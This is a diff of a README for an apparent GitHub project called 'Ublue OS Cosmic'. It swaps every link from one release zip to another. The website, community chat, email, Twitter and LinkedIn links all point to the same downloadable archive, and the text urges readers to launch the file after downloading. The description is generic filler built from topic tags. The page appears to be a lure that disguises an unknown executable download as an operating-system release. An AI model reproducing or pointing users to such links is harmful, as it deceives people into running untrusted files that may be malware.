@@ -4,7 +4,7 @@
 This repository is dedicated to Ublue OS Cosmic, an innovative operating system designed with a focus on immutability and atomic image-based concepts. While the short description is not clearly provided, you can explore the vast array of topics related to Ublue OS Cosmic such as atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, and operating-system.
 
 ## Get Started
-To get started with Ublue OS Cosmic, you can download the latest release package from [here](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip). Make sure to launch the file after downloading to begin exploring the exciting features of Ublue OS Cosmic!
+To get started with Ublue OS Cosmic, you can download the latest release package from [here](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip). Make sure to launch the file after downloading to begin exploring the exciting features of Ublue OS Cosmic!
 
 ## Features
 🌌 **Atomic**: Ublue OS Cosmic utilizes atomic concepts to ensure stability and reliability in the operating system environment.
@@ -22,24 +22,24 @@ To get started with Ublue OS Cosmic, you can download the latest release package
 🌐 **Operating System**: Learn more about the intricacies of operating systems through the lens of Ublue OS Cosmic.
 
 ## Explore Further
-For more information and detailed documentation, make sure to visit our official [website](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip) and immerse yourself in the cosmic experience of Ublue OS.
+For more information and detailed documentation, make sure to visit our official [website](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip) and immerse yourself in the cosmic experience of Ublue OS.
 
 ## Releases
 If the provided link for downloading the release package does not work or is not accessible, please navigate to the "Releases" section of this repository to find alternative download options.
 
-[![Download Release](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip)](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip)
+[![Download Release](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip)](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip)
 
 ## Get Involved
-💬 Join our [community chat](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip) to connect with other users, share experiences, and get support on using Ublue OS Cosmic.
+💬 Join our [community chat](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip) to connect with other users, share experiences, and get support on using Ublue OS Cosmic.
 
 🌟 Star this repository to show your support and stay updated on the latest developments and releases related to Ublue OS Cosmic.
 
 🚀 Start contributing to Ublue OS Cosmic by exploring the open issues and submitting your contributions to help enhance the operating system for all users.
 
 ## Let's Connect
-📧 For any inquiries, feedback, or collaboration opportunities, feel free to reach out to us via email at https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip
+📧 For any inquiries, feedback, or collaboration opportunities, feel free to reach out to us via email at https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip
 
-🌐 Connect with us on [Twitter](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip) and [LinkedIn](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v1.0/Soft.zip) to stay in the loop with the Ublue OS Cosmic community.
+🌐 Connect with us on [Twitter](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip) and [LinkedIn](https://github.com/peashooter0001/ublue-os-cosmic/releases/download/v2.0/Software.zip) to stay in the loop with the Ublue OS Cosmic community.
 
 ---
 
